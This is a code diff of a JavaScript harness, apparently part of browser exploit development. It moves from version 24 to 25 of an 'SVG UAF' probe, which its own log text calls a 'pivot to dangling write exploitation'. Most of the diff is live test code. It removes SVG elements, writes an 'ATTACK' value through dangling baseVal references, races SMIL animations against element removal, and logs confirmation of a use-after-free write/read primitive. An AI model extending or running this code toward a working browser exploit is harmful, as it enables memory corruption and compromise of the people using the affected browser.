-      log('  [!!] SENTINEL SURVIVED INTO B: field=' + which, 'bad');
-      log('  [!!] B is in A\'s freed IsoHeap slot!', 'bad');
-      log('  [!!] UAF primitive: write via bv_A, read via B\'s attrs = confirmed!', 'bad');
-    }
-
-    // cleanup
-    bv_BH = null; bv_BRX = null; bv_BX = null;
-    B = null;
-    await raf();
   }
+  log('  mismatches=' + mismatches + '/' + N + ' (0 = no cross-talk, >0 = C++ attr aliasing)', mismatches > 0 ? 'bad' : 'ok');
 
-  log('[*] COR: reused=' + reused, reused ? 'bad' : 'inf');
-  if (!reused) {
-    log('[*] even never-appended elements keep JSCell* pinned', 'inf');
-    log('[*] next: need explicit vm.gc() or different strategy', 'inf');
-  }
+  // Cleanup
+  rects = null; bvs = null;
+  log('[*] MUL: crossTalk=' + (mismatches > 0) + ' mismatches=' + mismatches, mismatches > 0 ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { reused: reused };
+  return { crossTalk: mismatches > 0, mismatches: mismatches };
+}
+
+// CSS: CSS animation on A, remove A mid-animation, check if animation continues writing
+async function runCSS(q) {
+  if (!q) { dis(true); sep(); log('CSS: CSS animation race - animation vs remove vs bv_A write', 'inf'); sep(); }
+
+  log('[*] create A with CSS width animation, remove A, check if animator still writes', 'ok');
+
+  // Create A with SVG presentation attribute that we can animate
+  var A = mkRect(80, 80);
+  var bv_AW = A.width ? A.width.baseVal : null;
+
+  // Set up SMIL animation on A's width
+  var anim = document.createElementNS(SVG_NS, 'animate');
+  anim.setAttribute('attributeName', 'width');
+  anim.setAttribute('from', '80');
+  anim.setAttribute('to', '200');
+  anim.setAttribute('dur', '0.1s');
+  anim.setAttribute('repeatCount', 'indefinite');
+  A.appendChild(anim);
+  await raf();
+
+  // Sample width before remove
+  var w_before = null;
+  try { w_before = bv_AW ? bv_AW.value : null; } catch(e) {}
+  log('  SMIL animation running: w_before=' + w_before, 'ok');
+
+  // Write our ATTACK value
+  var ATTACK = 77777.0;
+  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) {}
+
+  // Remove A while animation may still be in flight
+  A.remove();
+  await micro();
+
+  // Check: does bv_AW still return our attack value, or did animator overwrite it?
+  var w_after_remove = null;
+  try { w_after_remove = bv_AW ? bv_AW.value : null; } catch(e) {}
+  log('  after remove: bv_AW.value=' + w_after_remove + ' (attack=' + ATTACK + ')', w_after_remove === ATTACK ? 'ok' : 'bad');
+
+  // Wait a few frames - if animator still running on removed element, value changes
+  await raf(); await raf(); await raf();
+  var w_after_raf = null;
+  try { w_after_raf = bv_AW ? bv_AW.value : null; } catch(e) {}
+  log('  3 RAFs after remove: bv_AW.value=' + w_after_raf, 'inf');
+
+  var animatorStillRunning = (w_after_raf !== ATTACK);
+  if (animatorStillRunning) {
+    log('  [!!] SMIL ANIMATOR OVERWROTE our value on REMOVED element!', 'bad');
+    log('  [!!] animator running on removed element = multi-threaded UAF vector', 'bad');
+  } else {
+    log('  animator stopped on remove (or was never running)', 'ok');
+  }
+
+  A.remove();
+  log('[*] CSS: animatorContinued=' + animatorStillRunning, animatorStillRunning ? 'bad' : 'ok');
+  if (!q) dis(false);
+  return { animatorContinued: animatorStillRunning, w_before: w_before, w_after: w_after_raf };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v24 - gc probe, never-appended, iframe nuke, corruption chain', 'inf');
+  log('SVG UAF v25 - pivot to dangling write exploitation', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['GCP_gc_probe',    runGCP],
-    ['NAP_never_appnd', runNAP],
-    ['IFR_iframe_nuke', runIFR],
-    ['IFW_iframe_weak', runIFW],
-    ['COR_corrupt',     runCOR]
+    ['RLV_relive', runRLV],
+    ['LYT_layout', runLYT],
+    ['CHN_chain',  runCHN],
+    ['MUL_spray',  runMUL],
+    ['CSS_anim',   runCSS]
   ];
 
   for (var i = 0; i < tests.length; i++) {
     var lbl = tests[i][0];
     var fn  = tests[i][1];
-    sep();
-    log(lbl, 'inf');
-    sep();
+    sep(); log(lbl, 'inf'); sep();
     try { results[lbl] = await fn(true); }
     catch(e) { log('[!] ' + lbl + ': ' + e, 'bad'); results[lbl] = null; }
     log('');
   }
 
   sep();
-  log('SUMMARY v24', 'inf');
+  log('SUMMARY v25', 'inf');
   sep();
-  var keys = Object.keys(results);
+
+  var summary = {
+    'RLV': results['RLV_relive'] ? results['RLV_relive'].writePersists : '?',
+    'LYT_nan': results['LYT_layout'] ? results['LYT_layout'].anyNan : '?',
+    'LYT_inf': results['LYT_layout'] ? results['LYT_layout'].anyInf : '?',
+    'CHN': results['CHN_chain'] ? results['CHN_chain'].B_affected : '?',
+    'MUL_xtalk': results['MUL_spray'] ? results['MUL_spray'].crossTalk : '?',
+    'CSS_race': results['CSS_anim'] ? results['CSS_anim'].animatorContinued : '?'
+  };
+
+  var keys = Object.keys(summary);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
-    var r = results[k];
-    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-
-    var v;
-    if (r.gcCallable  !== undefined) v = r.gcCallable;
-    else if (r.gcCollected  !== undefined) v = r.gcCollected;
-    else if (r.finFired     !== undefined) v = r.finFired;
-    else if (r.reused       !== undefined) v = r.reused;
-    else v = '?';
-
-    log('  ' + k + ': key=' + v, v === true ? 'bad' : 'dim');
+    var v = summary[k];
+    log('  ' + k + ': ' + v, v === true ? 'bad' : 'dim');
   }
   sep();
   dis(false);
